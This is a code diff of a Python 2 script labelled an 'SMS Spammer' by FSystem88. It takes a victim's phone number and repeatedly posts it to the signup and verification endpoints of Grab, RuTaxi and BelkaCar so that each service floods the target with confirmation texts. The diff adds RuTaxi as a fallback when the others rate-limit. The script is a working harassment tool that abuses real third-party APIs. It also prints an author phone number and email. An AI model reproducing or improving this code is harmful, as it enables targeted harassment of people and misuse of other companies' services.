@@ -5,7 +5,7 @@ class spymer:
         print '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.1.5      8888\n8888888888888888888888888\n8888888888888888888888888\n'
         import requests, datetime, sys, time, argparse
         parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by Fsystem88. May be not work. LOL))", epilog='My contacts: +79153509908 (Russia) or e-mail - FSystem88@bk.ru')
-        parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 9153509908)')
+        parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 79153509908)')
         args = parser.parse_args()
 
         def showstatus(message, type='new'):
@@ -39,7 +39,7 @@ class spymer:
         if _phone[0] == '8':
             _phone = '62' + str(_phone)
         iteration = 1
-        print showstatus(wrapsbrace('info', True) + ('Send SMS to: +7{}').format(_phone))
+        print showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone))
         delaytime = 60
         if self.author != 'FSystem88':
             while True:
@@ -48,7 +48,7 @@ class spymer:
 
         while True:
             try:
-                grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': '7'+_phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+                grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             except KeyboardInterrupt:
                 print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
                 exit()
@@ -58,16 +58,27 @@ class spymer:
             else:
                 if grab.status_code == 429:
                     print showstatus(wrapsbrace(('429 GRAB:{}').format(grab.reason), True) + ('Start next service!'), 'warn')
-                    belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '7'+_phone}, headers={})
-                    if belka.status_code == 429:
-                        print showstatus(wrapsbrace(('429 BelkaCar{}').format(belka.reason), True) + ('The End!'), 'warn')
-                        exit()
-                    elif belka.status_code == 200:
-                        print showstatus(wrapsbrace('200 OK', True) + ('BelkaCar SMS sent! Sleep! Zzz... (iteration:{})').format(iteration))
+                    _phonerutaxi = _phone[1:]
+                    rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phonerutaxi})
+                    if rutaxi.status_code == 429:
+                        print showstatus(wrapsbrace(('429 RuTaxi:{}').format(rutaxi.reason), True) + ('Start next service!'), 'warn')
+                        belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
+                        if belka.status_code == 429:
+                            print showstatus(wrapsbrace(('429 BelkaCar{}').format(belka.reason), True) + ('The End!'), 'warn')
+                            exit()
+                        elif belka.status_code == 200:
+                            print showstatus(wrapsbrace('200 OK', True) + ('BelkaCar SMS sent! Sleep! Zzz... (iteration:{})').format(iteration))
+                            iteration += 1
+                            sleep(60)
+                        else:
+                            print showstatus(wrapsbrace(('{} {}').format(belka.status_code, belka.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
+                            exit()
+                    elif rutaxi.status_code == 200:
+                        print showstatus(wrapsbrace('200 OK', True) + ('RuTaxi SMS sent! Sleep! Zzz... (iteration:{})').format(iteration))
                         iteration += 1
                         sleep(60)
                     else:
-                        print showstatus(wrapsbrace(('{} {}').format(belka.status_code, belka.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
+                        print showstatus(wrapsbrace(('{} {}').format(rutaxi.status_code, rutaxi.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
                         exit()
                 elif grab.status_code == 200:
                     print showstatus(wrapsbrace('200 OK', True) + ('GRAB SMS sent! Sleep! Zzz... (iteration:{})').format(iteration))
